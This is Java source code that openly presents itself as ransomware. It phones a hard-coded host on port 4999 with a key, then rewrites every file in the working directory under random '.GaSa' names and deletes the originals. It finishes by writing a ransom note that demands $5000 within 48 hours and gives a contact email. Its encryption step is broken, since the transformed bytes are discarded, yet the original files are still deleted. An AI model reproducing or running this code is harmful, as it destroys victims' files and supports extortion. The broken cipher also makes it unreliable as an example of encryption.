/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ransomware_.gasa_encrypting;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Random;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author amine gasa
 */
public class Ransomware_Gasa_encrypting {

    static String getRandomName(int length, String extend) {
        Random r = new Random();
        StringBuilder res = new StringBuilder();

        for (int i = 0; i < length; i++) {

            char c = 'a';
            int width = 'z' - 'a';

            if (r.nextInt(3) == 0) {
                c = 'A';
                width = 'Z' - 'A';
            }
            if (r.nextInt(3) == 1) {
                c = '0';
                width = '9' - '0';
            }

            res.append((char) (c + r.nextInt(width)));

        }

        res.append(".").append(extend);

        return res.toString();
    }

    public static void main(String[] args) throws IOException {
        Socket s=new Socket("192.168.57.129", 4999);
        PrintWriter pr=new PrintWriter(s.getOutputStream());
        pr.println("the target was connected"); pr.println("his data are encrypted");
         pr.println("his key is : QDam78AZMLOoi20M?bvWxVP");
        pr.flush();pr.close();s.close();
        File ff = new File("");
        File src = new File(ff.getAbsolutePath());
        File[] files = src.listFiles();

        System.out.println("Encrypting...");

        for (File f : files) {
            try {
                Encrypting(f, src);
                f.delete();

            } catch (IOException ex) {
                Logger.getLogger(Ransomware_Gasa_encrypting.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
        ff=new File("IMPORTANT FILE.txt");
        FileWriter fw=new FileWriter(ff);
        PrintWriter pw=new PrintWriter(fw);
        pw.println("Your data are encrypted");
        pw.println("to recover you data you shloud payed 5000$ before 48 hour ,if you don't payed it in this period ");
          pw.println("the sum will be increased into 10000$ ");
          pw.println("contact me in my email :aminegasa2015@hotmail.com");
           pw.println("your key is :QDam78AZMLOoi20M?bvWxVP");pw.close();
    }

    static void Encrypting(File source, File dest) throws IOException {
        InputStream is = null;
        OutputStream os = null;

        dest = new File(dest.getPath().concat("/").concat(getRandomName(10, "GaSa")));

        try {
            is = new FileInputStream(source);
            os = new FileOutputStream(dest);

            os.write(new byte[]{(byte) source.getName().length()});
            os.write(stringToByte(source.getName()));

            byte[] buffer = new byte[1024];

            int length;

            while ((length = is.read(buffer)) > 0) {
                encryptAlgorithme(buffer, 2, 1, 3);
                os.write(buffer, 0, length);
            }

        } finally {
            is.close();
            os.close();
        }
    }

    static byte[] stringToByte(String data) {
        char[] ca = data.toCharArray();
        byte[] res = new byte[ca.length * 2];

        for (int i = 0; i < res.length; i++) {
            res[i] = (byte) ((ca[i / 2] >> (8 - (i % 2) * 8)) & 0xff);
        }

        return res;
    }

    static byte[] encryptAlgorithme(byte[] data, int a, int b, int c) {
        byte[] enc = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            if (i % a == 0) {
                enc[i] = (byte) (data[i] + b);
            } else {
                enc[i] = (byte) (data[i] - c);
            }
        }

        return enc;
    }
}
